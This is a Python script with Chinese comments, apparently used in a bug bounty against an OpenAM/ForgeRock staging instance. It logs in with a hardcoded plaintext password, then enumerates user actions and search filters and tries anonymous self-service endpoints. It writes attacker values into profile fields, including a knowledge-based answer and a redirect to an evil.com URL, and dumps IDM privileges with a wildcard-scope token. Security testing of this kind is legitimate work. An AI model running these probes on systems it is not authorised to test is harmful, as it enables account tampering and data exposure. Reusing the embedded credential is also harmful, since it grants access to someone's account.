# -*- coding: utf-8 -*-
"""AIC 第四十一轮:低价值面一轮打穿——5 个候选面快速探测(有信号再深挖)
A. users _action 枚举(link/unlink/assignRole/verifyMail 等 23 个)
B. 用户搜索面变体(_queryFilter=true/_queryId=query-all-ids)
C. PUT users 字段穷举(kbaInfo/memberOfOrgIDs/accountStatus/manager/telephoneNumber/
   description/authType/iplanet-am-user-success-url/preferences/marketing)
D. 匿名 selfservice action(getRequirements/create/submitRequirements/confirmRegistration)
E. IDM privilege 完整 dump(fr:idm:* token)
预期结果表:
  有信号 -> 任一 action 非 400/403;搜索返回数据;字段 PUT 200 且生效;匿名 action 非 403
  无信号 -> 全封闭,面关闭
注意:accountStatus 测试放最后(改 inactive 会锁自己,测完立即恢复)
"""
import requests, urllib3, json, time
from urllib.parse import quote
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
TOKEN_EP = BASE + '/am/oauth2/realms/alpha/access_token'
RU = 'https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'
COOKIE_NAME = 'aa942d46ece12ce'
FORM = {'Content-Type': 'application/x-www-form-urlencoded'}
U = BASE + '/am/json/realms/root/realms/alpha/users/' + MY_ID

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

# 登录
r = S.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
r2 = S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
tok = r2.json().get('tokenId')
S.headers.update({'Cookie': COOKIE_NAME + '=' + tok,
                  'Accept-API-Version': 'resource=2.1, protocol=1.0'})
print('LOGIN OK')

def probe(method, path, label='', body=None, sess=None):
    s = sess or S
    kw = {'timeout': 12, 'verify': False}
    if body is not None:
        kw['json'] = body
    try:
        r = s.request(method, BASE + path, **kw)
        print('%-4s %-76s -> %d %s%s' % (method, path[:76], r.status_code,
              r.text[:110].replace('\n', ' '), ('  <=' + label) if label else ''))
        return r
    except Exception as e:
        print('%-4s %-76s -> ERR %s' % (method, path[:76], str(e)[:60]))
        return None

print('\n=== A. users _action 枚举 ===')
for act in ['link', 'unlink', 'assignRole', 'removeRole', 'verifyMail', 'resendMail',
            'activate', 'deactivate', 'refresh', 'revokeTokens', 'validatePassword',
            'passwordReset', 'register', 'update', 'replace', 'get', 'read',
            'search', 'create', 'delete', 'forgotPassword', 'changePassword', 'logout']:
    r = probe('POST', U + '?_action=' + act, 'action=' + act)
    if r and r.status_code not in (400, 403, 404, 405, 501):
        print('  !! 信号: action=%s -> %d' % (act, r.status_code))
    time.sleep(0.2)

print('\n=== B. 用户搜索面变体 ===')
for q in ['_queryFilter=true', '_queryId=query-all-ids',
          '_queryFilter=userName%20co%20%22p%22',
          '_queryFilter=givenName%20sw%20%22R%22',
          '_queryFilter=true&_fields=userName,mail,_id',
          '_queryFilter=userName%20eq%20%22pccp%22&_fields=userName,_id,roles,mail']:
    r = probe('GET', '/am/json/realms/root/realms/alpha/users?' + q, 'query=' + q[:50])
    if r and r.status_code == 200 and '"resultCount":0' not in r.text and '"result":[]' not in r.text:
        print('  !! 信号: 搜索返回数据!')
    time.sleep(0.2)

print('\n=== C. PUT users 字段穷举 ===')
fields = [
    ('kbaInfo', [{'questionId': '1', 'answer': 'hacked_answer'}]),
    ('memberOfOrgIDs', ['1']),
    ('telephoneNumber', ['12345678']),
    ('description', ['hacked']),
    ('authType', ['LDAP']),
    ('iplanet-am-user-success-url', ['https://evil.com/after']),
    ('preferences/marketing', True),
    ('manager', {'_ref': 'managed/user/00000000-0000-0000-0000-000000000000'}),
]
for f, v in fields:
    r = probe('PUT', U, 'field=' + f, body={f: v})
    if r and r.status_code == 200:
        r2 = S.get(U, timeout=12, verify=False)
        hit = f in r2.text
        print('    -> 200! 字段存在性:', hit)
        S.put(U, json={f: ''}, timeout=12, verify=False)
    time.sleep(0.2)
# accountStatus 最后测
r = probe('PUT', U, 'field=accountStatus(inactive)', body={'accountStatus': 'inactive'})
if r and r.status_code == 200:
    print('  !! 信号: accountStatus 可改为 inactive!')
    S.put(U, json={'accountStatus': 'active'}, timeout=12, verify=False)
    print('    已恢复 active')

print('\n=== D. 匿名 selfservice action ===')
S0 = requests.Session()
S0.trust_env = False
S0.proxies = {'http': None, 'https': None}
S0.headers.update({'User-Agent': 'Mozilla/5.0', 'Accept-API-Version': 'resource=1.0, protocol=1.0'})
for ep in ['selfservice/userRegistration', 'selfservice/forgottenUsername', 'selfservice/forgotPassword']:
    for act in ['getRequirements', 'submitRequirements', 'create', 'search', 'confirmRegistration']:
        r = probe('POST', '/am/json/realms/alpha/' + ep + '?_action=' + act, 'anon ' + ep.split('/')[-1] + '/' + act,
                  body={}, sess=S0)
        if r and r.status_code not in (400, 403, 404, 405, 500, 503):
            print('  !! 信号: anon action=%s -> %d' % (act, r.status_code))
        time.sleep(0.15)

print('\n=== E. IDM privilege 完整 dump ===')
p = '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient&response_type=code' \
    '&redirect_uri=%s&scope=%s&state=t' % (quote(RU, safe=''), quote('openid fr:idm:*', safe=''))
r = S.get(BASE + p, timeout=15, verify=False, allow_redirects=False)
code = r.headers.get('Location', '').split('code=')[1].split('&')[0]
r2 = S.post(TOKEN_EP, data={'grant_type': 'authorization_code', 'code': code, 'redirect_uri': RU,
                            'client_id': 'endUserUIClient'}, headers=FORM, timeout=12, verify=False)
tok_idm = r2.json().get('access_token')
r = S.get(BASE + '/openidm/privilege',
          headers={'Authorization': 'Bearer ' + tok_idm, 'Accept-API-Version': 'resource=1.0'},
          timeout=12, verify=False)
print('privilege status:', r.status_code)
try:
    j = r.json()
    for res, perms in j.items():
        flags = {k: v.get('allowed') for k, v in perms.items() if isinstance(v, dict)}
        print('  %-40s %s' % (res, flags))
except Exception as e:
    print('parse err:', str(e)[:100], r.text[:200])
